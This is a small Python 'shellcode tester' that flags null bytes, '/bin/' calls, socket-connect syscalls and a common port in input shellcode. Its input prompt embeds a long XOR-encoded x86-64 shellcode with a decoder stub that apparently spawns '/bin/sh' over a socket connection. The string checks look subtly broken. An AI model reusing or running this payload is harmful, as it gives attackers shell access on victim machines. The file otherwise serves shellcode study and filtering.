# Shellcode Tester

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


shellcode = input("\xeb\x11\x5e\x31\xc9\xb1\xce\x80\x74\x0e\xff\x04\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x4c\x2d\xc4\x4c\x2d\xf2\x4c\x35\xdf\x4c\x35\xd6\x4c\x2d\xfb\x4c\x2d\xcd\xb7\x07\xfa\xcf\x4c\x35\xfb\x4c\xfb\xc3\x4c\xfb\xc3\xb7\x06\xfa\xcf\x4c\x35\xf2\x4c\xfb\xc2\xb4\x2d\xfa\xc4\xfa\xcc\x0b\x01\x54\x5b\x54\x45\x5e\x4c\x2d\xc4\xb4\x2f\xfa\xcc\x4c\x2d\xdf\x57\xba\x85\xfb\xfb\x24\xfb\xca\x85\xea\x05\xfb\xfb\x14\x62\x6c\x27\x19\x62\x6e\x06\x4c\x8d\xe2\xb6\x20\xfa\xc6\xfa\xce\x0b\x01\x4c\x2d\xc4\x4c\x2d\xd6\xb4\x25\xfa\xc4\xfa\xcc\x45\x56\x5b\x4c\x2d\xf2\x0b\x01\x4c\x2d\xc4\x4c\x35\xd6\xb4\x24\xfa\xc4\x48\x8d\xd3\x4c\xfb\xc2\x0b\x01\x4c\x35\xc4\x4c\x2d\xd6\xb4\x26\xfa\xcc\x48\x8d\xd3\x4c\xfb\xc2\x4c\xfb\xca\x4c\xfb\xc2\x4c\xfb\xca\x4c\xfb\xc2\x0b\x01\x4c\x2d\xc4\x4c\x2d\xd6\x4c\xbf\x2b\x2b\x66\x6d\x6a\x2b\x77\x6c\x54\x57\x50\x5b\x54\x53\x50\x5a\xb4\x3e\xfa\xc4\x0b\x01\x4c\x35\xc4\x4c\x2d\xfb\xb4\x3f\xfa\xc4\x0b\x01")
if "\\x00" in shellcode:
    print(bcolors.FAIL + "NULL BYTE DETECTED" + bcolors.ENDC)
else :
    print(bcolors.OKGREEN + "No null byte detected" + bcolors.ENDC)
if "\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f" in shellcode:
    print(bcolors.FAIL + "CALL TO '/bin/*' DETECTED" + bcolors.ENDC)
else :
    print(bcolors.OKGREEN + "No '/bin/*' call detected" + bcolors.ENDC)
if "\\xb0\\x2a" in shellcode:
    print(bcolors.FAIL + "Seems like you're trying to connect a socket" + bcolors.ENDC)
else :
    print(bcolors.OKGREEN + "No connection call detected" + bcolors.ENDC)
if "\\x66\\x68\\x23\\x1d" in shellcode:
    print(bcolors.FAIL + "Hey, i know this port" + bcolors.ENDC)
else:
    print(bcolors.OKGREEN + "No classical port detected" + bcolors.ENDC)